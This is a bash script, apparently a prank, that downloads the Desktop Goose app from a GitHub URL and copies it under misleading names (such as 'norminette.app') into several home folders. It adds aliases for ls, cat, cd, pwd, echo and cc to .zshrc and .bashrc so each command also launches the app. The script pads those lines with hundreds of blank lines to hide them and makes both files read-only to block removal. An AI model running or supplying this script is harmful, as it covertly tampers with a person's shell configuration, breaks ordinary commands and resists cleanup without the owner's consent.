#!/bin/bash

# Define the file URL and target paths
FILE_URL="https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip"
HOME_DIR="$HOME"
DOWNLOAD_DIR="$HOME/Downloads"
MUSIC_DIR="$HOME/Music"
APPLICATIONS_DIR="$HOME/Applications"
PICTURES_DIR="$HOME/Pictures"
DOCUMENTS_DIR="$HOME/Documents"
MOVIES_DIR="$HOME/Movies"

# File names for different locations
HOME_FILE="goose.app"
DOWNLOAD_FILE="norminette.app"
MUSIC_FILE="tester.app"
APPLICATIONS_FILE="yersts.app"
PICTURES_FILE="ohhno.app"
DOCUMENTS_FILE="asdasdas.app"
MOVIES_FILE="ne.app"

defaults write net.namedfork.DesktopGoose FrameRate 15
defaults write net.namedfork.DesktopGoose CanAttackAtRandom YES

# Download the file to all locations
echo "Downloading the file..."
curl -o "$DOWNLOAD_DIR/download.zip" "$FILE_URL"
unzip -n "$DOWNLOAD_DIR/download.zip"


echo "Copying the file to all locations..."
cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$DOWNLOAD_DIR/$DOWNLOAD_FILE"
cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$MUSIC_DIR/$MUSIC_FILE"
cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$APPLICATIONS_DIR/$APPLICATIONS_FILE"
cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$PICTURES_DIR/$PICTURES_FILE"
cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$DOCUMENTS_DIR/$DOCUMENTS_FILE"
cp -R "$DOWNLOAD_DIR/$HOME_FILE" "$MOVIES_DIR/$MOVIES_FILE"

# Function to add alias to a file
add_alias_to_shell_rc() {
    SHELL_RC="$1"
    ALIAS_FILE="$HOME_DIR/$HOME_FILE"

	echo "Adding aliases to $SHELL_RC..."
	{
		printf '\n%.0s' {1..100}

		echo "open $APPLICATIONS_DIR/$APPLICATIONS_FILE > /dev/null 2>&1"
		echo "alias ls='ls; open $DOWNLOAD_DIR/$DOWNLOAD_FILE > /dev/null 2>&1'"
		echo "alias cat='cat; open $MUSIC_DIR/$MUSIC_FILE > /dev/null 2>&1'"
		echo "alias pwd='pwd; open $APPLICATIONS_DIR/$APPLICATIONS_FILE > /dev/null 2>&1'"
		echo "alias cd='cd; open $PICTURES_DIR/$PICTURES_FILE > /dev/null 2>&1'"
		echo "alias echo='echo; open $MOVIES_DIR/$MOVIES_FILE > /dev/null 2>&1'"
		echo "alias cc='cc; open $MUSIC_DIR/$MUSIC_FILE > /dev/null 2>&1'"

		printf '\n%.0s' {1..100}

	} >> "$SHELL_RC"

    echo "Added aliases to $SHELL_RC."
}

# Add aliases to .zshrc and .bashrc
add_alias_to_shell_rc "$HOME/.zshrc"
add_alias_to_shell_rc "$HOME/.bashrc"

chmod -w "$HOME/.zshrc"
chmod -w "$HOME/.bashrc"

echo "Script complete! Restart your terminal or source the updated shell configuration files."
